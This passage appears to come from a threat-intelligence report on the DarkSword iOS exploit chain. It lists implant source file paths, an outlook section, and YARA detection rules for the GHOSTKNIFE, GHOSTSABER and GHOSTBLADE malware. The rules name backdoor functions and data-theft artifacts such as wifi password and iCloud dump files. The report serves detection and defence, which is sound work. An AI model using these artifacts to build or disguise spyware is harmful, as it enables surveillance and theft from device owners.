+src/libs/Driver/DriverNewThread.js
+src/libs/Driver/Offsets.js
+src/libs/Driver/OffsetsTable.js
+src/libs/JSUtils/FileUtils.js
+src/libs/JSUtils/Logger.js
+src/libs/JSUtils/Utils.js
+src/libs/TaskRop/Exception.js
+src/libs/TaskRop/ExceptionMessageStruct.js
+src/libs/TaskRop/ExceptionReplyStruct.js
+src/libs/TaskRop/MachMsgHeaderStruct.js
+src/libs/TaskRop/PAC.js
+src/libs/TaskRop/PortRightInserter.js
+src/libs/TaskRop/RegistersStruct.js
+src/libs/TaskRop/RemoteCall.js
+src/libs/TaskRop/Sandbox.js
+src/libs/TaskRop/SelfTaskStruct.js
+src/libs/TaskRop/Task.js
+src/libs/TaskRop/TaskRop.js
+src/libs/TaskRop/Thread.js
+src/libs/TaskRop/ThreadState.js
+src/libs/TaskRop/VM.js
+src/libs/TaskRop/VmMapEntry.js
+src/libs/TaskRop/VMObject.js
+src/libs/TaskRop/VmPackingParams.js
+src/libs/TaskRop/VMShmem.js
+src/loader.js
+src/main.js
+src/MigFilterBypassThread.js
+Figure 22: Filepath artifacts from GHOSTBLADE sample
+Outlook and Implications
+The use of both DarkSword and Coruna by a variety of actors demonstrates the ongoing risk of exploit proliferation across actors of varying geography and motivation. Google remains committed to aiding in the mitigation of this problem, in part through our ongoing participation in the [Pall Mall Process](https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities), designed to build consensus and progress toward limiting the harms from the spyware industry. Together, we are focused on developing international norms and frameworks to limit the misuse of these powerful technologies and protect human rights around the world. These efforts are built on earlier governmental actions, including [steps taken](https://www.federalregister.gov/documents/2023/03/30/2023-06730/prohibition-on-use-by-the-united-states-government-of-commercial-spyware-that-poses-risks-to) by the US Government to limit government use of spyware, and a [first-of-its-kind international](https://2021-2025.state.gov/joint-statement-on-efforts-to-counter-the-proliferation-and-misuse-of-commercial-spyware/) commitment to similar efforts.
+Acknowledgments
+We would like to acknowledge and thank Lookout, iVerify, [Google Project-Zero](http://projectzero.google/), and Apple Security Engineering & Architecture team for their partnership throughout this investigation.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [GTI Collection](https://www.virustotal.com/gui/collection/bd631d6c4cec1759bc298b8da180d9ed1d7d89475376bc614176c3541460f40c/summary) for registered users. We've also uploaded a sample of GHOSTBLADE to VirusTotal.
+Network Indicators
+File Indicators
+Detections
+YARA Rules
+rule G_Backdoor_GHOSTKNIFE_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "server_pub_ex"
+$ = "client_pri_ds"
+$ = "getfilebyExtention"
+$ = "getContOfFilesForModule"
+$ = "carPlayConnectionState"
+$ = "saveRecordingApp"
+$ = "getLastItemBack"
+$ = "the inherted class"
+$ = "passExtetion"
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them
+}
+rule G_Backdoor_GHOSTSABER_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "sendDeviceInfoJson"
+$ = "merge2AppLists"
+$ = "send_command_to_upper_process"
+$ = "ChangeStatusCheckSleepInterval"
+$ = "SendRegEx"
+$ = "evalJsResponse.json"
+$ = "sendSimpleUploadJsonObject"
+$ = "device_info_all"
+$ = "getPayloadForSimpleStatusRequest"
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them
+}
+rule G_Datamine_GHOSTBLADE_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "/private/var/tmp/wifi_passwords.txt"
+$ = "/private/var/tmp/wifi_passwords_securityd.txt"
+$ = "/.com.apple.mobile_container_manager.metadata.plist" fullword
+$ = "X-Device-UUID: ${"
+$ = "/installed_apps.txt" fullword
+$ = "icloud_dump_" fullword
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 3 of them
+}
+rule G_Hunting_DarkSwordExploitChain_ImplantLib_FilePaths_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "src/InjectJS.js"
+$ = "src/libs/Chain/Chain.js"
+$ = "src/libs/Chain/Native.js"
+$ = "src/libs/Chain/OffsetsStruct.js"
+$ = "src/libs/Driver/Driver.js"
+$ = "src/libs/Driver/DriverNewThread.js"
+$ = "src/libs/Driver/Offsets.js"
+$ = "src/libs/Driver/OffsetsTable.js"
+$ = "src/libs/JSUtils/FileUtils.js"
+$ = "src/libs/JSUtils/Logger.js"
+$ = "src/libs/JSUtils/Utils.js"
+$ = "src/libs/TaskRop/Exception.js"
+$ = "src/libs/TaskRop/ExceptionMessageStruct.js"
+$ = "src/libs/TaskRop/ExceptionReplyStruct.js"
+$ = "src/libs/TaskRop/MachMsgHeaderStruct.js"
+$ = "src/libs/TaskRop/PAC.js"
+$ = "src/libs/TaskRop/PortRightInserter.js"
+$ = "src/libs/TaskRop/RegistersStruct.js"
+$ = "src/libs/TaskRop/RemoteCall.js"
+$ = "src/libs/TaskRop/Sandbox.js"
+$ = "src/libs/TaskRop/SelfTaskStruct.js"
+$ = "src/libs/TaskRop/Task.js"
+$ = "src/libs/TaskRop/TaskRop.js"
+$ = "src/libs/TaskRop/Thread.js"
+$ = "src/libs/TaskRop/ThreadState.js"
+$ = "src/libs/TaskRop/VM.js"
+$ = "src/libs/TaskRop/VmMapEntry.js"
+$ = "src/libs/TaskRop/VMObject.js"
+$ = "src/libs/TaskRop/VmPackingParams.js"
+$ = "src/libs/TaskRop/VMShmem.js"
+$ = "src/MigFilterBypassThread.js"
+condition:
+any of them
+}</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
